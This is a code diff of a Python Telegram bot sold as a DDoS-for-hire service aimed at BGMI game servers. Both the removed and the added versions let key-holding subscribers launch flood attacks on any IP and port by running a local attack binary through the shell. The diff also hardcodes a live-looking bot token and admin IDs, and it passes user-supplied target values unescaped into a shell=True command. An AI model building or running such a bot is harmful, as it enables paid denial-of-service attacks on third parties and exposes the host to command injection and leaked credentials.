@@ -1,149 +1,127 @@
-import asyncio
-import time
-import logging
-from telegram import Update
-from telegram.ext import Application, CommandHandler, CallbackContext
+import telebot
+import subprocess
+import datetime
+import os
+import uuid
 
-# सेटअप लॉगिंग
-logging.basicConfig(format="%(asctime)s - %(levelname)s - %(message)s", level=logging.INFO)
+# Insert your Telegram bot token here
+bot = telebot.TeleBot('7555897511:AAGoAFosRrkVtMq2UnaKg1sKQkRDmIB0lws')
 
-# कॉन्फ़िगरेशन
-TELEGRAM_BOT_TOKEN = '7555897511:AAGoAFosRrkVtMq2UnaKg1sKQkRDmIB0lws'
-ADMIN_USER_ID = "7129010361"  # अब ये स्ट्रिंग में है ताकि तुलना सही हो
-KEYS_FILE = 'keys.txt'
+# Admin user IDs
+admin_id = ["YOUR_ADMIN_ID_HERE", "7129010361"]
 
-# Keys लोड करने का फ़ंक्शन
-def load_keys():
+# File to store allowed user IDs and their subscription expiry
+USER_FILE = "users.txt"
+SUBSCRIPTION_FILE = "subscriptions.txt"
+LOG_FILE = "log.txt"
+KEY_FILE = "keys.txt"
+
+# Subscription periods
+subscription_periods = {
+    '1min': 60,
+    '1hour': 3600,
+    '6hours': 21600,
+    '12hours': 43200,
+    '1day': 86400,
+    '3days': 259200,
+    '7days': 604800,
+    '1month': 2592000,
+    '2months': 5184000
+}
+
+# Key system functions
+def read_keys():
+    keys = {}
     try:
-        with open(KEYS_FILE) as f:
-            return {line.split(":")[0]: int(line.split(":")[1]) for line in f}
+        with open(KEY_FILE, "r") as file:
+            lines = file.read().splitlines()
+            for line in lines:
+                parts = line.split()
+                if len(parts) >= 2:
+                    key = parts[0]
+                    expiry_str = " ".join(parts[1:])
+                    try:
+                        expiry = datetime.datetime.strptime(expiry_str, '%Y-%m-%d %H:%M:%S')
+                        keys[key] = expiry
+                    except ValueError:
+                        print(f"Error parsing date for key {key}: {expiry_str}")
     except FileNotFoundError:
-        return {}
+        pass
+    return keys
 
-def save_keys(keys):
-    with open(KEYS_FILE, 'w') as f:
-        for user, expiry in keys.items():
-            f.write(f"{user}:{expiry}\n")
+def write_keys(keys):
+    with open(KEY_FILE, "w") as file:
+        for key, expiry in keys.items():
+            file.write(f"{key} {expiry.strftime('%Y-%m-%d %H:%M:%S')}\n")
 
-keys = load_keys()
-print("✅ 🔑 Keys loaded successfully!")
+def validate_key(key):
+    if key in keys:
+        if datetime.datetime.now() < keys[key]:
+            return True
+        else:
+            del keys[key]
+            write_keys(keys)
+    return False
 
-# /start कमांड
-async def start(update: Update, context: CallbackContext):
-    chat_id = update.effective_chat.id
-    message = (
-        "🔥 WELCOME TO 💸[Ravi_Op]⚡ DDOS\n"
-        "👑 OWNER: @R_SDanger\n"
-        "🎯 SERVER: BGMI\n"
-        "🚀 USE /attack TO START ATTACK"                  
-    )
-    print(f"✅ /start used by {chat_id} 🏁")
-    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')
+# Initialize key storage
+keys = read_keys()
 
-# /genkey फिक्स्ड वर्जन
-async def genkey(update: Update, context: CallbackContext):
-    chat_id = update.effective_chat.id
-    user_id = str(update.effective_user.id)  # अब स्ट्रिंग में कन्वर्ट किया
-
-    if user_id != ADMIN_USER_ID:
-        await context.bot.send_message(chat_id=chat_id, text="🚫 *सिर्फ एडमिन इस कमांड का यूज़ कर सकता है!*", parse_mode='Markdown')
-        print(f"❌ Non-admin {user_id} tried to use /genkey 🚷")
-        return
-
-    args = context.args
-    if not args or len(args) != 2:
-        await context.bot.send_message(chat_id=chat_id, text="⚠️ *यूसेज:* /genkey user_id दिन", parse_mode='Markdown')
-        print("⚠️ Incorrect usage of /genkey command ⚙️")
-        return
-
-    target_user = str(args[0])
-    days = int(args[1])
-    expiry_time = int(time.time()) + (days * 86400)
-
-    keys[target_user] = expiry_time
-    save_keys(keys)
-    print(f"✅ 🔑 Key generated for {target_user} for {days} days")
-
-    await context.bot.send_message(chat_id=chat_id, text=f"✅ *User {target_user} को {days} दिन का एक्सेस मिल गया!* 🎉", parse_mode='Markdown')
-
-# /myinfo कमांड (यूजर अपना स्टेटस चेक कर सके)
-async def myinfo(update: Update, context: CallbackContext):
-    chat_id = update.effective_chat.id
-    user_id = str(update.effective_user.id)
-
-    if user_id not in keys or keys[user_id] < time.time():
-        await context.bot.send_message(chat_id=chat_id, text="❌ *तेरा एक्सेस ख़तम हो गया बे! DM कर @R_SDanger*", parse_mode='Markdown')
-        print(f"❌ User {user_id} tried to check expired info 🚷")
-        return
-
-    remaining_time = keys[user_id] - int(time.time())
-    days, hours, minutes = remaining_time // 86400, (remaining_time % 86400) // 3600, (remaining_time % 3600) // 60
-
-    print(f"✅ 📝 User {user_id} checked info: {days} days left")
-    await context.bot.send_message(chat_id=chat_id, text=f"📝 *तेरा स्टेटस:* \n⏳ *बचा हुआ टाइम:* {days} दिन, {hours} घंटे, {minutes} मिनट\n🔥 *ओनर:* @R_SDanger", parse_mode='Markdown')
-
-# अटैक प्रोसेस
-async def run_attack(chat_id, ip, port, duration, context):
+# Function to read user IDs from the file
+def read_users():
     try:
-        print(f"🚀 Starting attack on {ip}:{port} for {duration} seconds 💥")
-        process = await asyncio.create_subprocess_shell(
-            f"./LEGEND {ip} {port} {duration} 150",
-            stdout=asyncio.subprocess.PIPE,
-            stderr=asyncio.subprocess.PIPE
-        )
-        stdout, stderr = await process.communicate()
+        with open(USER_FILE, "r") as file:
+            return file.read().splitlines()
+    except FileNotFoundError:
+        return []
 
-        if stdout:
-            print(f"✅ [stdout]\n{stdout.decode()}")
-        if stderr:
-            print(f"⚠️ [stderr]\n{stderr.decode()}")
+# Initialize allowed user IDs
+allowed_user_ids = read_users()
 
+# Attack command (Unlimited Attacks Allowed)
+@bot.message_handler(commands=['RS'])
+def handle_attack(message):
+    user_id = str(message.chat.id)
+
+    if user_id in allowed_user_ids:
+        command = message.text.split()
+        if len(command) == 4:
+            target = command[1]
+            port = int(command[2])
+            time = int(command[3])
+
+            if time > 240:
+                response = "⏳ टाइम लिमिट 240 सेकंड से ज्यादा नहीं हो सकती!"
+            else:
+                bot.reply_to(message, "🔑 अटैक अप्रूवल के लिए अपनी Key डालो:")
+                bot.register_next_step_handler(message, lambda msg: validate_and_execute_attack(msg, target, port, time))
+        else:
+            response = "⚡ सही फॉर्मेट: `/RS <target> <port> <time>`"
+    else:
+        response = "❌ आपको अटैक करने की परमिशन नहीं है!"
+    
+    bot.reply_to(message, response)
+
+# Validate key and execute attack (Unlimited Attacks)
+def validate_and_execute_attack(message, target, port, time):
+    user_id = str(message.chat.id)
+    command = message.text.split()
+
+    if len(command) > 0:
+        user_key = command[0]
+        if validate_key(user_key):
+            bot.reply_to(message, f"🚀 अटैक शुरू हो चुका है: {target}:{port} ({time} सेकंड)!")
+
+            full_command = f"./bgmi {target} {port} {time} 100"
+            subprocess.Popen(full_command, shell=True)  # Popen से अटैक बैकग्राउंड में रन होगा
+
+        else:
+            bot.reply_to(message, "❌ गलत या एक्सपायर्ड Key!")
+    else:
+        bot.reply_to(message, "❌ कृपया अपनी Key डालें!")
+
+# Polling the bot
+while True:
+    try:
+        bot.polling(none_stop=True)
     except Exception as e:
-        print(f"⚠️ Error in attack: {str(e)} ❌")
-        await context.bot.send_message(chat_id=chat_id, text=f"⚠️ *Error:* {str(e)}", parse_mode='Markdown')
-
-    finally:
-        print(f"✅ Attack on {ip}:{port} completed 🎯")
-        await context.bot.send_message(chat_id=chat_id, text="✅ *Attack Completed Successfully!* 🎯🔥", parse_mode='Markdown')
-
-# /attack कमांड (Unlimited Attack)
-async def attack(update: Update, context: CallbackContext):
-    chat_id = update.effective_chat.id
-    user_id = str(update.effective_user.id)
-    args = context.args
-
-    if user_id not in keys or keys[user_id] < time.time():
-        await context.bot.send_message(chat_id=chat_id, text="💀 *तेरा एक्सेस खत्म हो गया बे! DM कर » @R_SDanger*", parse_mode='Markdown')
-        print(f"❌ User {user_id} tried to attack without access 🚷")
-        return
-
-    if len(args) != 3:
-        await context.bot.send_message(chat_id=chat_id, text="🌟 *यूसेज:* /attack ip port time", parse_mode='Markdown')
-        print("⚠️ Incorrect usage of /attack command ⚙️")
-        return
-
-    ip, port, time_sec = args
-    print(f"✅ 🚀 Attack launched by {user_id} on {ip}:{port} for {time_sec} sec")
-    await context.bot.send_message(chat_id=chat_id, text=(
-        f"🚀 *𝗔𝗧𝗧𝗔𝗖𝗞 𝗟𝗔𝗨𝗡𝗖𝗛𝗘𝗗*\n"
-        f"🎯 *Target:* {ip}\n"
-        f"💥 *Port:* {port}\n"
-        f"⏳ *Time:* {time_sec} sec\n"
-        f"🔥 *Owner:* @R_SDanger"
-    ), parse_mode='Markdown')
-
-    asyncio.create_task(run_attack(chat_id, ip, port, time_sec, context))
-
-# बॉट शुरू करें
-def main():
-    print("🚀 Bot is starting... ⚡")
-    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
-    application.add_handler(CommandHandler("start", start))
-    application.add_handler(CommandHandler("genkey", genkey))
-    application.add_handler(CommandHandler("myinfo", myinfo))
-    application.add_handler(CommandHandler("attack", attack))
-    print("✅ Bot is running... 🎯")
-    application.run_polling()
-
-if __name__ == '__main__':
-    main()
+        print(e)
